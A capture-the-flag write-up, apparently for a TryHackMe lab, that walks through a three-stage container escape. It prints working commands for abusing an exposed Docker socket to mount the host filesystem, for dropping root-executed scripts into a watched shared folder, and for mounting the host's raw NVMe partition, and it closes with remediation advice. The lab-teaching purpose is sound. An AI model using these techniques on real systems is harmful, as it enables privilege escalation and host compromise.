# Matryoshka — Multi-Layered Container Escape Walkthrough

> **Platform:** TryHackMe (boot2root) · **Category:** Container Breakout / Lateral Movement · **Difficulty:** Hard
> **Author:** Artem · **Type:** Professional write-up

---

## Executive Summary

**Matryoshka** is a boot2root laboratory built around lateral movement, nested-environment pivoting, and container breakout techniques. It simulates a modern corporate scenario in which internal developer misconfigurations cascade into full host compromise.

This write-up documents the complete kill chain: abusing an exposed Docker socket on **Level 1**, navigating strict environment restrictions on **Level 2** through asynchronous execution buffers, and finally achieving host takeover via **direct block-device interaction** on **Level 3**.

The two non-obvious breakthroughs of this box:

1. **Blind (asynchronous) RCE** — command execution with *no* interactive channel, driven entirely through a watched `inbox` → `outbox` file bridge.
2. **Block-device escape** — bypassing container isolation by mounting the host's raw NVMe partition instead of relying on a live shell.

---

## Infrastructure Topology

The environment is a nested virtualization chain — the Russian *Matryoshka* doll principle:

| Layer | Role |
|-------|------|
| **Level 1 Container** | Initial entry point. Exposed, world-writable Docker socket. |
| **Level 2 Container** | Instantiated by mounting Level 1's root filesystem. Limited network utilities. |
| **Level 3 Container** | Runs an automated file-monitoring daemon hooked to a shared volume. |
| **Physical Host** | Bare-metal infrastructure running the virtualization stack. |

---

## Phase 1 — Level 1 → Level 2

After establishing an initial foothold inside the Level 1 container, enumeration of local permissions revealed a classic high-severity deployment flaw: the host's Docker socket (`docker.sock`) was **world-writable**.

**Mechanism:** access to `docker.sock` is equivalent to root on the host. The daemon runs as root, so any client able to talk to the socket can request a container that mounts the host filesystem and steps out of its own namespace.

Using the local `docker` binary, I spawned a privileged container mounting the host's absolute root directory:

```bash
docker run -v /:/mnt -it alpine sh
```

After switching the execution context with `chroot /mnt`, I effectively controlled the Level 2 filesystem and gained access to administrative cryptographic assets under `/certs/client`.

---

## Phase 2 — Level 2 → Level 3 (The Asynchronous Buffer)

### Network Reconnaissance

Mapping the local network stack (`ip a`, `ifconfig`, `ip route`) placed the container at `172.17.0.2` in a `/16` subnet, routing through the gateway `172.17.0.1`.

Testing the extracted TLS client certificates against the gateway's management port (`2376`) produced an X.509 signature error:

```
x509: certificate is valid for 127.0.0.1, 172.18.0.2, not 172.17.0.1
```

**Why this matters:** the error leaks the existence of a *parallel* network (`172.18.0.0/16`) on the upper host. The certificate's SAN list is intelligence — it tells you which hosts the PKI was actually issued for, and confirms that standard network interaction from the current subnet is invalid.

### Weaponizing the Shared Volume

A filesystem search exposed a high-privilege interaction bridge:

```bash
find / -type d -name "inbox" 2>/dev/null
# Output: /mnt/level3share/inbox
```

`/mnt/level3share/inbox` was globally writable (`drwxrwxrwx`). Operational analysis confirmed that an automated Level 3 worker watched this directory via an event-driven mechanism (`inotify`-style), executing incoming payloads **as root** and writing errors to an adjacent `outbox` folder.

### Bypassing Shell Restrictions

Interactive channels (reverse and bind shells) via `netcat` failed due to binary limitations — the native `nc` on Level 3 lacked the execute flag:

```
nc: service "-e" unknown
```

Raw TCP wrappers (`/dev/tcp/`) also failed, because the executing environment used a strict `sh`/`dash` shell rather than `bash` (the `/dev/tcp` pseudo-device is a Bash-only feature).

**The pivot:** because the architecture enforced absolute network isolation between execution boundaries, an interactive shell was never going to work. I switched to **Blind / Asynchronous RCE** — feed commands into `inbox`, harvest results from `outbox`. No live channel required; the daemon *is* the execution primitive.

```bash
echo -e '#!/bin/sh\ncat /root/flag_level3.txt' \
  > /mnt/level3share/inbox/getflag.sh && \
  chmod +x /mnt/level3share/inbox/getflag.sh
```

**Level 3 Flag:** `THM{RW_B1████}`

---

## Phase 3 — Escape to the Physical Host

To reach the bare-metal machine, I dropped a diagnostic payload into the execution pipeline to enumerate kernel namespaces, block-device configuration, and hardware allocation:

```bash
echo -e '#!/bin/sh\necho "=== PARTITIONS ==="\ncat /proc/partitions\necho "=== DEVICES ==="\nls -la /dev/nvme*' \
  > /mnt/level3share/inbox/host_recon.sh && \
  chmod +x /mnt/level3share/inbox/host_recon.sh
```

The output log exposed the critical flaw:

```
=== AVAILABLE DEVICES ===
brw-rw---- 1 root disk 259, 1 Jul 18 07:39 /dev/nvme0n1
brw-rw---- 1 root disk 259, 2 Jul 18 07:39 /dev/nvme0n1p1
```

**Reading the signal:** the leading `b` in `brw-rw----` marks these as **block devices** — raw host storage mapped straight into the container layer. Despite running inside a virtualized jail, the root process held direct read/write access to the host's physical disk (`/dev/nvme0n1p1`). At that point the filesystem boundary is cosmetic: you don't need to escape the process namespace if you can read the underlying sectors directly.

### Executing the Jailbreak

I deployed a payload to create a mount point, attach the host's physical partition, and read the true administrative space of the underlying OS:

```bash
echo -e '#!/bin/sh\nmkdir -p /tmp/host_root\nmount /dev/nvme0n1p1 /tmp/host_root 2>&1\ncat /tmp/host_root/root/flag*' \
  > /mnt/level3share/inbox/get_host_flag.sh && \
  chmod +x /mnt/level3share/inbox/get_host_flag.sh
```

The Level 3 daemon executed the mount successfully. By reading directly from the underlying disk sector, the container boundary was bypassed entirely — **without ever holding an interactive remote shell.**

**Host Flag:** `THM{SP@C3████}`

---

## Remediation & Defensive Hardening

- **Isolate the Docker daemon socket.** Never expose `/var/run/docker.sock` to non-privileged containers. Use the Docker HTTP API protected by mutual TLS (mTLS).
- **Enforce container minimalism.** Strip runtimes of tools like `mount`, `mkfifo`, or raw terminal binaries unless strictly required — this alone would have blocked Phase 3.
- **Restrict block-device allocation.** Block devices (`/dev/sd*`, `/dev/nvme*`) must never be propagated into untrusted containers. Avoid `--privileged`.
- **Secure shared volumes.** Never let a root daemon execute files directly from user-writable directories. Replace file-drop execution bridges with a hardened message queue (e.g., RabbitMQ) and validate/sign payloads.

---

## Key Takeaways

| Boundary | Root Cause | Primitive Used |
|----------|-----------|----------------|
| L1 → L2 | World-writable `docker.sock` | Host FS mount + `chroot` |
| L2 → L3 | World-writable watched `inbox`, root executor | Blind/asynchronous RCE |
| L3 → Host | Raw block device exposed to container | Direct partition `mount` |

*The recurring lesson: each layer failed not on a novel exploit but on a trust boundary that was writable, over-privileged, or leaked its own topology.*
